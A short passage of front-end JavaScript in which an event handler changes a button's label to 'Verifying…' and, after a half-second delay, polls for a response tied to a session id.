    this.querySelector('button').textContent = 'Verifying…';

    setTimeout(() => { pollForResponse(sessionId, this.querySelector('button')); }, 500);
  });
}
